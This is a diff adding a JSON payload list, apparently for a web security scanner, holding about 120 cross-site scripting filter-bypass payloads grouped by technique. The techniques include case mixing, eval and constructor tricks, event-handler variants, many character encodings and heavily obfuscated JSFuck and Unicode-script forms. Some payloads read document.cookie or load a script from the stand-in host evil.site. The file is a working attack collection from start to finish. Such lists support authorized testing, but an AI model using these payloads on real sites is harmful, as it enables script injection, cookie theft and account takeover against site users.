@@ -1,0 +1,601 @@
+{
+  "category": "XSS Filter Bypass",
+  "keyword": "filter_bypass",
+  "payloads": [
+    {
+      "type": "Bypass Case Sensitive",
+      "tech": ["filter_bypass"],
+      "payload": "<sCrIpt>alert(1)</ScRipt>"
+    },
+    {
+      "type": "Bypass Case Sensitive",
+      "tech": ["filter_bypass"],
+      "payload": "<ScrIPt>alert(1)</ScRipT>"
+    },
+    {
+      "type": "Bypass Tag Blacklist",
+      "tech": ["filter_bypass"],
+      "payload": "<script x>"
+    },
+    {
+      "type": "Bypass Tag Blacklist",
+      "tech": ["filter_bypass"],
+      "payload": "<script x>alert('XSS')<script y>"
+    },
+    {
+      "type": "Bypass Word Blacklist with Code Evaluation",
+      "tech": ["filter_bypass"],
+      "payload": "eval('ale'+'rt(0)');"
+    },
+    {
+      "type": "Bypass Word Blacklist with Code Evaluation",
+      "tech": ["filter_bypass"],
+      "payload": "Function(\"ale\"+\"rt(1)\")();"
+    },
+    {
+      "type": "Bypass Word Blacklist with Code Evaluation",
+      "tech": ["filter_bypass"],
+      "payload": "new Function`al\\ert\\`6\\``;"
+    },
+    {
+      "type": "Bypass Word Blacklist with Code Evaluation",
+      "tech": ["filter_bypass"],
+      "payload": "setTimeout('ale'+'rt(2)');"
+    },
+    {
+      "type": "Bypass Word Blacklist with Code Evaluation",
+      "tech": ["filter_bypass"],
+      "payload": "setInterval('ale'+'rt(10)');"
+    },
+    {
+      "type": "Bypass Word Blacklist with Code Evaluation",
+      "tech": ["filter_bypass"],
+      "payload": "Set.constructor('ale'+'rt(13)')();"
+    },
+    {
+      "type": "Bypass Word Blacklist with Code Evaluation",
+      "tech": ["filter_bypass"],
+      "payload": "Set.constructor`al\\x65rt\\x2814\\x29```;"
+    },
+    {
+      "type": "Bypass with Incomplete HTML Tag",
+      "tech": ["filter_bypass"],
+      "payload": "<img src='1' onerror='alert(0)' <"
+    },
+    {
+      "type": "Bypass Quotes for String",
+      "tech": ["filter_bypass"],
+      "payload": "String.fromCharCode(88,83,83)"
+    },
+    {
+      "type": "Bypass Quotes in Script Tag",
+      "tech": ["filter_bypass"],
+      "payload": "http://localhost/bla.php?test=</script><script>alert(1)</script>"
+    },
+    {
+      "type": "Bypass Quotes in Mousedown Event",
+      "tech": ["filter_bypass"],
+      "payload": "<a href=\"\" onmousedown=\"var name = '&#39;;alert(1)//'; alert('smthg')\">Link</a>"
+    },
+    {
+      "type": "Bypass Dot Filter",
+      "tech": ["filter_bypass"],
+      "payload": "<script>window['alert'](document['domain'])</script>"
+    },
+    {
+      "type": "Bypass Dot Filter",
+      "tech": ["filter_bypass"],
+      "payload": "<script>eval(atob(\"YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\"))<script>"
+    },
+    {
+      "type": "Bypass Parenthesis for String",
+      "tech": ["filter_bypass"],
+      "payload": "alert`1`"
+    },
+    {
+      "type": "Bypass Parenthesis for String",
+      "tech": ["filter_bypass"],
+      "payload": "setTimeout`alert\\u0028document.domain\\u0029`;"
+    },
+    {
+      "type": "Bypass Parenthesis and Semi Colon",
+      "tech": ["filter_bypass"],
+      "payload": "<script>onerror=alert;throw 1337</script>"
+    },
+    {
+      "type": "Bypass Parenthesis and Semi Colon",
+      "tech": ["filter_bypass"],
+      "payload": "<script>{onerror=alert}throw 1337</script>"
+    },
+    {
+      "type": "Bypass Parenthesis and Semi Colon",
+      "tech": ["filter_bypass"],
+      "payload": "<script>throw onerror=alert,'some string',123,'haha'</script>"
+    },
+    {
+      "type": "Bypass Parenthesis and Semi Colon",
+      "tech": ["filter_bypass"],
+      "payload": "<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>"
+    },
+    {
+      "type": "Bypass Parenthesis and Semi Colon",
+      "tech": ["filter_bypass"],
+      "payload": "<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>"
+    },
+    {
+      "type": "Bypass onxxxx Blacklist",
+      "tech": ["filter_bypass"],
+      "payload": "<object onafterscriptexecute=confirm(0)>"
+    },
+    {
+      "type": "Bypass onxxxx Blacklist",
+      "tech": ["filter_bypass"],
+      "payload": "<object onbeforescriptexecute=confirm(0)>"
+    },
+    {
+      "type": "Bypass onxxxx Blacklist",
+      "tech": ["filter_bypass"],
+      "payload": "<img src='1' onerror\\x00=alert(0) />"
+    },
+    {
+      "type": "Bypass onxxxx Blacklist",
+      "tech": ["filter_bypass"],
+      "payload": "<img src='1' onerror\\x0b=alert(0) />"
+    },
+    {
+      "type": "Bypass onxxxx Blacklist",
+      "tech": ["filter_bypass"],
+      "payload": "<img src='1' onerror\\x0d=alert(0) />"
+    },
+    {
+      "type": "Bypass onxxxx Blacklist",
+      "tech": ["filter_bypass"],
+      "payload": "<img src='1' onerror\\x0a=alert(0) />"
+    },
+    {
+      "type": "Bypass onxxxx Blacklist",
+      "tech": ["filter_bypass"],
+      "payload": "<img src='1' onerror/=alert(0) />"
+    },
+    {
+      "type": "Bypass Space Filter",
+      "tech": ["filter_bypass"],
+      "payload": "<img/src='1'/onerror=alert(0)>"
+    },
+    {
+      "type": "Bypass Space Filter",
+      "tech": ["filter_bypass"],
+      "payload": "<svg\u000conload\u000c=\u000calert(1)\u000c>"
+    },
+    {
+      "type": "Bypass Email Filter",
+      "tech": ["filter_bypass"],
+      "payload": "\"><svg/onload=confirm(1)>\"@x.y"
+    },
+    {
+      "type": "Bypass Email Filter",
+      "tech": ["filter_bypass"],
+      "payload": "xss@example.com(<img src='x' onerror='alert(document.location)'>)"
+    },
+    {
+      "type": "Bypass Tel URI Filter",
+      "tech": ["filter_bypass"],
+      "payload": "+330011223344;phone-context=<script>alert(0)</script>"
+    },
+    {
+      "type": "Bypass Document Blacklist",
+      "tech": ["filter_bypass"],
+      "payload": "<div id = \"x\"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>"
+    },
+    {
+      "type": "Bypass Document Blacklist",
+      "tech": ["filter_bypass"],
+      "payload": "window[\"doc\"+\"ument\"]"
+    },
+    {
+      "type": "Bypass document.cookie Blacklist",
+      "tech": ["filter_bypass"],
+      "payload": "window.cookieStore.get('COOKIE NAME').then((cookieValue)=>{alert(cookieValue.value);});"
+    },
+    {
+      "type": "Bypass using Javascript Inside a String",
+      "tech": ["filter_bypass"],
+      "payload": "<script>\nfoo=\"text </script><script>alert(1)</script>\";\n</script>"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Redirect",
+      "tech": ["filter_bypass"],
+      "payload": "location=\"http://google.com\""
+    },
+    {
+      "type": "Bypass using an Alternate Way to Redirect",
+      "tech": ["filter_bypass"],
+      "payload": "document.location = \"http://google.com\""
+    },
+    {
+      "type": "Bypass using an Alternate Way to Redirect",
+      "tech": ["filter_bypass"],
+      "payload": "document.location.href=\"http://google.com\""
+    },
+    {
+      "type": "Bypass using an Alternate Way to Redirect",
+      "tech": ["filter_bypass"],
+      "payload": "window.location.assign(\"http://google.com\")"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Redirect",
+      "tech": ["filter_bypass"],
+      "payload": "window['location']['href']=\"http://google.com\""
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "window['alert'](0)"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "parent['alert'](1)"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "self['alert'](2)"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "top['alert'](3)"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "this['alert'](4)"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "frames['alert'](5)"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "content['alert'](6)"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "[7].map(alert)"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "[8].find(alert)"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "[9].every(alert)"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "[10].filter(alert)"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "[11].findIndex(alert)"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "[12].forEach(alert);"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]](\"1\")"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "prompt`${document.domain}`"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "document.location='java\\tscript:alert(1)'"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "document.location='java\\rscript:alert(1)'"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "document.location='java\\tscript:alert(1)'"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "eval('ale'+'rt(0)');"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "Function(\"ale\"+\"rt(1)\")();"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "new Function`al\\ert\\`6\\``;"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "constructor.constructor(\"aler\"+\"t(3)\")();"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "[].filter.constructor('ale'+'rt(4)')();"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "top[\"al\"+\"ert\"](5);"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "top[8680439..toString(30)](7);"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "top[/al/.source+/ert/.source](8);"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "top['al\\x65rt'](9);"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "open('java'+'script:ale'+'rt(11)');"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "location='javascript:ale'+'rt(12)';"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "setTimeout`alert\\u0028document.domain\\u0029`;"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "setTimeout('ale'+'rt(2)');"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "setInterval('ale'+'rt(10)');"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "Set.constructor('ale'+'rt(13)')();"
+    },
+    {
+      "type": "Bypass using an Alternate Way to Execute an Alert",
+      "tech": ["filter_bypass"],
+      "payload": "Set.constructor`al\\x65rt\\x2814\\x29```;"
+    },
+    {
+      "type": "Bypass \">\" using Nothing",
+      "tech": ["filter_bypass"],
+      "payload": "<svg onload=alert(1)//"
+    },
+    {
+      "type": "Bypass \"<\" and \">\" using ＜ and ＞",
+      "tech": ["filter_bypass"],
+      "payload": "＜script/src=//evil.site/poc.js＞"
+    },
+    {
+      "type": "Bypass \";\" using Another Character",
+      "tech": ["filter_bypass"],
+      "payload": "'te' * alert('*') * 'xt';"
+    },
+    {
+      "type": "Bypass \";\" using Another Character",
+      "tech": ["filter_bypass"],
+      "payload": "'te' / alert('/') / 'xt';"
+    },
+    {
+      "type": "Bypass \";\" using Another Character",
+      "tech": ["filter_bypass"],
+      "payload": "'te' % alert('%') % 'xt';"
+    },
+    {
+      "type": "Bypass \";\" using Another Character",
+      "tech": ["filter_bypass"],
+      "payload": "'te' - alert('-') - 'xt';"
+    },
+    {
+      "type": "Bypass \";\" using Another Character",
+      "tech": ["filter_bypass"],
+      "payload": "'te' + alert('+') + 'xt';"
+    },
+    {
+      "type": "Bypass \";\" using Another Character",
+      "tech": ["filter_bypass"],
+      "payload": "'te' ^ alert('^') ^ 'xt';"
+    },
+    {
+      "type": "Bypass \";\" using Another Character",
+      "tech": ["filter_bypass"],
+      "payload": "'te' > alert('>') > 'xt';"
+    },
+    {
+      "type": "Bypass \";\" using Another Character",
+      "tech": ["filter_bypass"],
+      "payload": "'te' < alert('<') < 'xt';"
+    },
+    {
+      "type": "Bypass \";\" using Another Character",
+      "tech": ["filter_bypass"],
+      "payload": "'te' == alert('==') == 'xt';"
+    },
+    {
+      "type": "Bypass \";\" using Another Character",
+      "tech": ["filter_bypass"],
+      "payload": "'te' & alert('&') & 'xt';"
+    },
+    {
+      "type": "Bypass \";\" using Another Character",
+      "tech": ["filter_bypass"],
+      "payload": "'te' , alert(',') , 'xt';"
+    },
+    {
+      "type": "Bypass \";\" using Another Character",
+      "tech": ["filter_bypass"],
+      "payload": "'te' | alert('|') | 'xt';"
+    },
+    {
+      "type": "Bypass \";\" using Another Character",
+      "tech": ["filter_bypass"],
+      "payload": "'te' ? alert('ifelsesh') : 'xt';"
+    },
+    {
+      "type": "Bypass \";\" using Another Character",
+      "tech": ["filter_bypass"],
+      "payload": "'te' in alert('in') in 'xt';"
+    },
+    {
+      "type": "Bypass \";\" using Another Character",
+      "tech": ["filter_bypass"],
+      "payload": "'te' instanceof alert('instanceof') instanceof 'xt';"
+    },
+    {
+      "type": "Bypass using HTML Encoding",
+      "tech": ["filter_bypass"],
+      "payload": "%26%2397;lert(1)"
+    },
+    {
+      "type": "Bypass using HTML Encoding",
+      "tech": ["filter_bypass"],
+      "payload": "&#97;&#108;&#101;&#114;&#116;"
+    },
+    {
+      "type": "Bypass using HTML Encoding",
+      "tech": ["filter_bypass"],
+      "payload": "></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>"
+    },
+    {
+      "type": "Bypass using Katakana",
+      "tech": ["filter_bypass"],
+      "payload": "javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()"
+    },
+    {
+      "type": "Bypass using Cuneiform",
+      "tech": ["filter_bypass"],
+      "payload": "𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+\"(𒀀)\")()"
+    },
+    {
+      "type": "Bypass using Lontara",
+      "tech": ["filter_bypass"],
+      "payload": "ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+\"(ᨆ)\")()"
+    },
+    {
+      "type": "Bypass using ECMAScript6",
+      "tech": ["filter_bypass"],
+      "payload": "<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>"
+    },
+    {
+      "type": "Bypass using Octal encoding",
+      "tech": ["filter_bypass"],
+      "payload": "javascript:'\\74\\163\\166\\147\\40\\157\\156\\154\\157\\141\\144\\75\\141\\154\\145\\162\\164\\50\\61\\51\\76'"
+    },
+    {
+      "type": "Bypass using Unicode",
+      "tech": ["filter_bypass"],
+      "payload": "<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>"
+    },
+    {
+      "type": "Bypass using Unicode",
+      "tech": ["filter_bypass"],
+      "payload": "%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/"
+    },
+    {
+      "type": "Bypass using UTF-7",
+      "tech": ["filter_bypass"],
+      "payload": "+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-"
+    },
+    {
+      "type": "Bypass using UTF-8",
+      "tech": ["filter_bypass"],
+      "payload": "< = %C0%BC = %E0%80%BC = %F0%80%80%BC"
+    },
+    {
+      "type": "Bypass using UTF-8",
+      "tech": ["filter_bypass"],
+      "payload": "> = %C0%BE = %E0%80%BE = %F0%80%80%BE"
+    },
+    {
+      "type": "Bypass using UTF-8",
+      "tech": ["filter_bypass"],
+      "payload": "' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7"
+    },
+    {
+      "type": "Bypass using UTF-8",
+      "tech": ["filter_bypass"],
+      "payload": "\" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2"
+    },
+    {
+      "type": "Bypass using UTF-8",
+      "tech": ["filter_bypass"],
+      "payload": "\" = %CA%BA"
+    },
+    {
+      "type": "Bypass using UTF-8",
+      "tech": ["filter_bypass"],
+      "payload": "' = %CA%B9"
+    },
+    {
+      "type": "Bypass using UTF-16be",
+      "tech": ["filter_bypass"],
+      "payload": "%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00"
+    },
+    {
+      "type": "Bypass using UTF-16be",
+      "tech": ["filter_bypass"],
+      "payload": "\\x00<\\x00s\\x00v\\x00g\\x00/\\x00o\\x00n\\x00l\\x00o\\x00a\\x00d\\x00=\\x00a\\x00l\\x00e\\x00r\\x00t\\x00(\\x00)\\x00>"
+    },
+    {
+      "type": "Bypass using UTF-32",
+      "tech": ["filter_bypass"],
+      "payload": "%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E"
+    },
+    {
+      "type": "Bypass using BOM",
+      "tech": ["filter_bypass"],
+      "payload": "%fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E"
+    },
+    {
+      "type": "Bypass using BOM",
+      "tech": ["filter_bypass"],
+      "payload": "%00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E"
+    },
+    {
+      "type": "Bypass using JSfuck",
+      "tech": ["filter_bypass"],
+      "payload": "[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()"
+    }
+  ]
+}
